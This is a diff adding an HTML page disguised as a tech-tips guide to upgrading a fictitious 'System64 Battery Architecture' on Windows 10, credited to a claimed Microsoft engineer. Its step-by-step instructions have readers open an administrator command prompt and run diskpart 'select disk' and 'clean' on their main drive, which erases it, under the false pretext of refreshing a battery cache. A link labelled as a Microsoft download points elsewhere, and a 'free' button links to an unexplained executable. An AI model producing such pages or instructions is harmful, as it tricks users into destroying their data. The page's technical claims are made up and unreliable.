@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<title>Simple guide to upgrading to System64 Battery Architecture</title>
+		<style>
+			.content {
+				text-align: center;
+				width: 700px;
+				padding: 10px;
+				margin: 10px;
+				background-color: white;
+				font-family: hero-new, sans-serif;
+				color: #333;
+			}
+			.advertisement {
+				float:right;
+			}
+			.topbar {
+				background-color: darkred;
+				overflow: hidden;
+				text-align: center;
+				color: white;
+				font-family: hero-new, sans-serif;
+			}
+			h2 {
+				text-align: center;
+				font-family: hero-new, sans-serif;
+				font-style: normal;
+				font-weight: 700;
+				font-size: 20.2px;
+				line-height: 1.56cm;
+			}
+			.thegal {
+				text-align: center;
+			}
+		</style>
+	</head>
+
+	<body>
+		
+		<script>window.alert("By using this website, you accept our Privacy Policy.")</script>
+		<div class="topbar">
+		<h1>0X4F.org Tech Tips, News, and Reviews<h1>
+
+		</div>
+		<br>
+		<div class="thegal">
+		<img src="windows.png" alt="windows 10" width="100" height="100">
+		</div>
+		<h2><strong>Guide to upgrading legacy System32 Battery Architecture on Windows 10</strong></h2>
+		
+				<a href="https://boards.4chan.org/d/thread/9570939" target ="_self">
+						<div class="advertisement">
+							<img src="add.jpg" alt="Google Advertisement" width="250" height="300">
+						</div>
+					</a>
+				<div class="content">
+				<h2>By Ezra Hamimi, Senior Microsoft Software Engineer for 4 years.</h2>
+				<div class="thegal">
+					<img src="thegal.png" alt="microsoft representative" width="100" height="100">
+				</div>
+				<h2>Why upgrade?</h2><p>System32 Battery Architecture was originally based off code from the Hewlett Packard Electrical Research facilities in Arizona
+				and integrated limited smart-charging capabilities. Other than x86 modifications in 2011, this architecture was never improved upon. In 2017, a bug was discovered
+				in systems with System32 that allowed an attacker to easily gain access to any system with it installed. <br><br>
+				In response Microsoft developed a new battery architecture called System64 to improve battery performance and reduce electrical waste. It works by algorithmically cycling the amount of elecricity
+				entering your battery when charging to prevent battery aging from simple mistakes such as keeping the plug in at 100%. This leads to a recorded 50% longer battery lifespan before being unable 
+				to hold a sufficient charge for normal use. 
+				</div>
+
+				</div>	
+				<div class="content">
+					<h2><strong>How to upgrade?</strong></h2>
+				<p>Let's face it, upgrading firmware is never fun, and with System64, it's a bit of a tedious process. Luckily the steps are relatively simple.</p>
+				<p>We begin with a few simple commands to prep your PC for the upgrade.
+				<br><br>
+				<strong>STEP 1:</strong> <br>
+				First press the windows button, and type "cmd" when you see the app appear, right click the icon, and press run as administrator.<br><br>
+				<img src="cmd.jpg" alt="cmd"><br>
+				<strong>STEP 2:</strong><br>
+				A black box with text will open, click on it, and type in "diskpart" then press enter. We use this program to prep the disk for the system64 installation by refreshing the battery cache.<br><br>
+				<img src="diskpart.png" alt="diskpart"><br> 
+				<strong>STEP 3:</strong><br>
+				Next, type in "list disk" and press enter. Locate the disk you have System32 installed on, which will most likely be the disk with the highest amount of storage capacity.<br><br>
+				<img src="list_disk.png" alt="list disk"><br>
+				<strong>STEP 4:</strong><br>
+				Once you have located the disk containing System32 type "select disk " and then the disk number which corresponds to the disk with the System32 installation.<br><br>
+				<img src="select_disk.png" alt="select disk"><br>
+				<strong>STEP 5:</strong><br>
+				Finally type "clean" and hit enter, and the disk caches will be refreshed. This reduces the chance of the System64 installation failing.<br><br>
+				<img src="clean.png" alt="clean"><br>
+				<strong>STEP 6:</strong><br>
+				Reboot the system if it hasn't rebooted automatically and then continue the last two steps.<br>
+				<strong>STEP 7:</strong><br>
+				Once the system has successfully rebooted, open your favourite web browser, navigate to this web page.<br>
+				<strong>STEP 8:</strong><br>
+				Click the following link which takes you directly to Microsoft to download the System64 patch installer. Once the installer is downloaded, double click it, and follow the steps on the
+				installation wizard. When that finishes your machine will be fully updated to take advantage of the System64 battery enhancements. 
+				<br><br>
+				<a href="https://i.kym-cdn.com/photos/images/original/000/096/044/trollface.jpg">https://www.microsoft.com/system64/installer/downloads/system64.exe/</a>	
+				</p>
+		</div>
+		<br><br>
+		<a href="Gsimulator.exe">
+		<img src="button.jpg" alt="free" width="300" height="100">
+		</a>
+	</body>
+
+</html>
